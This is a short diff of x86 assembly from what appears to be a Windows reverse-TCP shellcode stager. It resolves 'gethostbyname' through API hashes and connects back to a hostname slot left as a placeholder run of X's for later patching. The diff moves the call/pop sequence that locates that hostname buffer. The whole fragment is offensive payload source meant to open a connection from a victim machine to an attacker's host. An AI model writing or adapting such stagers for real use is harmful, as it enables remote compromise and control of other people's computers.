@@ -36,7 +36,10 @@ reverse_tcp:
   xchg edi, eax          ; save the socket for later, don't care about the value of eax after this
 
 get_address:
-  jmp get_hostname
+  call got_hostname
+
+hostname:
+  db "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", 0x00
 
 got_hostname:
   push 0x803428A9        ; hash( "ws2_32.dll", "gethostbyname" )
@@ -66,12 +69,6 @@ handle_failure:
 failure:
   push 0x56A2B5F0        ; hardcoded to exitprocess for size
   call ebp
-
-get_hostname:
-  call got_hostname
-
-hostname:
-  db "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", 0x00
 
 connected:
 
